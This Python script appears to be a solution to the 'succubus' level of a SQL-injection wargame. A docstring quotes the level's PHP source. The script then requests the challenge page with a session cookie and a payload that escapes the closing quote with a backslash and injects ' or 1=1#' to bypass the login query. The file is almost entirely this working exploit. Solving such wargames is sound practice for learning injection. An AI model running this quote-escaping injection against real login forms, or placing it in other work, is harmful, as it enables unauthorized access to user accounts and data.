import requests

"""
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
"""


url = "https://los.eagle-jump.org/succubus_8ab2d195be2e0b10a3b5aa2873d0863f.php"
payload = {"id":'\\',"pw":" or 1=1#"} 
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
r = requests.get(url,params=payload,cookies=cookie)
print(r.text)
if 'Clear' in r.text:
    print("clear")
else:
    print("try again")